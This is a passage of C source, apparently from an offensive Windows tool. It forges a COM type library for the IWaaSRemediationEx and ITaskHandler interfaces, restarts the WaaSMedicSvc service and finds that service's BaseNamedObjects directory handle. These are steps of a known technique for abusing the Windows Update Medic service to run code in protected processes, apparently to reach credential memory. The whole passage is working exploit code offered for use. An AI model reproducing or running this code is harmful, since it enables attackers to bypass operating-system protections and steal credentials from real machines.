        hr = ITypeInfo_GetRefTypeInfo(TypeInfoOrig, hRefType, &TypeInfoRef);
        if (hr != S_OK)
            continue;

        hr = ICreateTypeInfo_AddRefTypeInfo(TypeInfoNew, TypeInfoRef, &hRefType);
        if (hr != S_OK)
            continue;

        hr = ICreateTypeInfo_AddImplType(TypeInfoNew, i, hRefType);
        if (hr != S_OK)
            continue;

        safe_release((IUnknown**)&TypeInfoRef);
    }

    //
    // Get the description of each function, modify them and add them to the new TypeLib.
    // See https://thrysoee.dk/InsideCOM+/ch09b.htm
    //


    for (i = 0; i < pTypeAttrOrig->cFuncs; i++)
    {
        hr = ITypeInfo_GetFuncDesc(TypeInfoOrig, i, &pFuncDescOrig);
        if (hr != S_OK)
            continue;

        if (pFuncDescOrig->memid != 0x60020000 && pFuncDescOrig->memid != 0x60020001)
        {
            ITypeInfo_ReleaseFuncDesc(TypeInfoOrig, pFuncDescOrig);
            continue;
        }

        hr = ITypeInfo_GetNames(TypeInfoOrig, pFuncDescOrig->memid, Names, sizeof(Names) / sizeof(*Names), &cNames);
        if (hr != S_OK)
        {
            ITypeInfo_ReleaseFuncDesc(TypeInfoOrig, pFuncDescOrig);
            continue;
        }


        if (pFuncDescOrig->memid == 0x60020000)
        {
            // LaunchDetectionOnly

            ldoParams[0].tdesc.vt = VT_BSTR;
            ldoParams[0].paramdesc.wParamFlags = PARAMFLAG_FIN;
            ldoParams[1].tdesc.vt = VT_UI8;
            ldoParams[1].paramdesc.wParamFlags = PARAMFLAG_FIN;

            pFuncDescOrig->lprgelemdescParam = ldoParams;
        }
        else if (pFuncDescOrig->memid == 0x60020001)
        {
            // LaunchRemediationOnly

            lroParams[0].tdesc.vt = VT_BSTR;
            lroParams[0].paramdesc.wParamFlags = PARAMFLAG_FIN;
            lroParams[1].tdesc.vt = VT_BSTR;
            lroParams[1].paramdesc.wParamFlags = PARAMFLAG_FIN;
            lroParams[2].tdesc.vt = VT_UI8;
            lroParams[2].paramdesc.wParamFlags = PARAMFLAG_FIN;

            pFuncDescOrig->lprgelemdescParam = lroParams;
        }

        pFuncDescOrig->cParams += 1;
        Names[pFuncDescOrig->cParams] = SysAllocString(L"unknown");
        cNames += 1;

        pFuncDescOrig->funckind = FUNC_PUREVIRTUAL; // Change function type from "dispatch" to "pure virtual"
        pFuncDescOrig->elemdescFunc.tdesc.vt = VT_HRESULT; // Set return type to HRESULT
        hr = ICreateTypeInfo_AddFuncDesc(TypeInfoNew, 0, pFuncDescOrig); // Add function description to the interface
        if (hr != S_OK)
            continue;
        hr = ICreateTypeInfo_SetFuncAndParamNames(TypeInfoNew, 0, Names, cNames); // Set function and parameter names
        if (hr != S_OK)
            continue;

        for (j = 0; j < cNames; j++)
        {
            SysFreeString(Names[j]); // Free the strings returned by "GetNames"
        }

        ITypeInfo_ReleaseFuncDesc(TypeInfoOrig, pFuncDescOrig);
    }

    //
    // END: Write the IWaaSRemediationEx interface
    //
    if (pTypeAttrOrig)
    {
        ITypeInfo_ReleaseTypeAttr(TypeInfoOrig, pTypeAttrOrig);
    }
    safe_release((IUnknown**)&TypeInfoOrig);

    //
    // BEGIN: Write the ITaskHandler interface
    //

    hr = ITypeLib_GetTypeInfoOfGuid(TypeLibOrig, &InterfaceGuid2, &TypeInfoOrig); // Get info about ITaskHandler interface
    if (hr != S_OK)
    {
        function_failed("GetTypeInfoOfGuid");
        goto cleanup;
    }

    hr = ITypeInfo_GetTypeAttr(TypeInfoOrig, &pTypeAttrOrig); // Get interface content
    if (hr != S_OK)
    {
        function_failed("GetTypeAttr");
        goto cleanup;
    }

    hr = ITypeInfo_GetDocumentation(TypeInfoOrig, MEMBERID_NIL, &TypeLibName, NULL, NULL, NULL); // Get TypeLib name
    if (hr != S_OK)
    {
        function_failed("GetDocumentation");
        goto cleanup;
    }

    hr = ICreateTypeLib2_CreateTypeInfo(TypeLibNew, TypeLibName, TKIND_INTERFACE, &TypeInfoNew2); // Type: "dispatch" to "interface"
    if (hr != S_OK)
    {
        function_failed("CreateTypeInfo");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetTypeFlags(TypeInfoNew2, TYPEFLAG_FHIDDEN | TYPEFLAG_FNONEXTENSIBLE | TYPEFLAG_FOLEAUTOMATION);
    if (hr != S_OK)
    {
        function_failed("SetTypeFlags");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetGuid(TypeInfoNew2, &pTypeAttrOrig->guid);
    if (hr != S_OK)
    {
        function_failed("SetGuid");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetVersion(TypeInfoNew2, pTypeAttrOrig->wMajorVerNum, pTypeAttrOrig->wMinorVerNum);
    if (hr != S_OK)
    {
        function_failed("SetVersion");
        goto cleanup;
    }

    // Add references to implemented interfaces
    for (i = 0; i < pTypeAttrOrig->cImplTypes; i++)
    {
        hr = ITypeInfo_GetRefTypeOfImplType(TypeInfoOrig, i, &hRefType);
        if (hr != S_OK)
            continue;

        hr = ITypeInfo_GetRefTypeInfo(TypeInfoOrig, hRefType, &TypeInfoRef);
        if (hr != S_OK)
            continue;

        ICreateTypeInfo_AddRefTypeInfo(TypeInfoNew2, TypeInfoRef, &hRefType);
        ICreateTypeInfo_AddImplType(TypeInfoNew2, i, hRefType);

        safe_release((IUnknown**)&TypeInfoRef);
    }

    for (i = 0; i < pTypeAttrOrig->cFuncs; i++)
    {
        hr = ITypeInfo_GetFuncDesc(TypeInfoOrig, i, &pFuncDescOrig);
        if (hr != S_OK)
            continue;

        hr = ITypeInfo_GetNames(TypeInfoOrig, pFuncDescOrig->memid, Names, sizeof(Names) / sizeof(*Names), &cNames);
        if (hr != S_OK)
        {
            ITypeInfo_ReleaseFuncDesc(TypeInfoOrig, pFuncDescOrig);
            continue;
        }

        hr = ICreateTypeInfo_AddFuncDesc(TypeInfoNew2, 0, pFuncDescOrig); // Add function description to the interface
        if (hr != S_OK)
            continue;

        hr = ICreateTypeInfo_SetFuncAndParamNames(TypeInfoNew2, 0, Names, cNames); // Set function and parameter names
        if (hr != S_OK)
            continue;

        for (j = 0; j < cNames; j++)
        {   
            SysFreeString(Names[j]); // Free the strings returned by "GetNames"
        }

        ITypeInfo_ReleaseFuncDesc(TypeInfoOrig, pFuncDescOrig);
    }

    //
    // END: Write the ITaskHandler interface
    //

    hr = ICreateTypeLib2_SaveAllChanges(TypeLibNew);
    if (hr != S_OK)
    {
        function_failed("SaveAllChanges");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    safe_release((IUnknown**)&TypeInfoRef);
    safe_release((IUnknown**)&TypeInfoNew);
    if (TypeLibName) SysFreeString(TypeLibName);
    if (pTypeAttrOrig)
    {
        ITypeInfo_ReleaseTypeAttr(TypeInfoOrig, pTypeAttrOrig);
    }
    safe_release((IUnknown**)&TypeInfoOrig);
    safe_release((IUnknown**)&TypeLibNew);
    if (pTLibAttrOrig)
    {
        ITypeLib_ReleaseTLibAttr(TypeLibOrig, pTLibAttrOrig);
    }
    safe_release((IUnknown**)&TypeLibOrig);

    if (!ret_val)
        DPRINT_ERR("Failed to write TypeLib to file: %ls", TypeLibPath);

    return ret_val;
}

BOOL restart_waa_s_medic_svc()
{
    BOOL  ret_val = FALSE;
    BOOL  success = FALSE;
    DWORD dwWaaSMedicStatus;

    success = get_service_status_by_name(
        STR_WAASMEDIC_SVC,
        &dwWaaSMedicStatus);
    if (!success)
        goto cleanup;

    if (dwWaaSMedicStatus == SERVICE_RUNNING)
    {
        DPRINT("%ls is running, stopping it...", STR_WAASMEDIC_SVC);
        success = stop_service_by_name(STR_WAASMEDIC_SVC, TRUE);
        if (!success)
           goto cleanup;
    }

    DPRINT("Starting service %ls...", STR_WAASMEDIC_SVC);
    success = start_service_by_name(STR_WAASMEDIC_SVC, TRUE);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL find_saa_s_medic_svc_pid(
    IN LPDWORD Pid)
{
    return get_service_process_id(STR_WAASMEDIC_SVC, Pid);
}

BOOL find_waa_s_medic_svc_base_named_objects_handle(
    OUT PHANDLE BaseNamedObjectsHandle)
{
    DWORD        saa_s_medic_svc_pid    = 0;
    BOOL         ret_val                = FALSE;
    BOOL         success                = FALSE;
    PHANDLE_LIST handle_list            = NULL;

    success = find_saa_s_medic_svc_pid(&saa_s_medic_svc_pid);
    if (!success)
        goto cleanup;

    success = find_directory_handles_in_process(
        saa_s_medic_svc_pid,
        0,
        &handle_list);
    if (!success)
        goto cleanup;

    if (handle_list->Count < 1)
    {
        DPRINT_ERR("No handle of type 'Directory' was found in the process with PID %ld.", saa_s_medic_svc_pid);
        goto cleanup;
    }

    if (handle_list->Count > 1)
    {
        DPRINT_ERR("More than one handle of type 'Directory' was found in process with PID %ld.", saa_s_medic_svc_pid);
        goto cleanup;
    }

    *BaseNamedObjectsHandle = handle_list->Handle[0];

    ret_val = TRUE;

cleanup:
    if (!ret_val)
    {
        DPRINT("NTDLL is probably not patched.");
    }

    if (handle_list)
        intFree(handle_list);

    return ret_val;
}
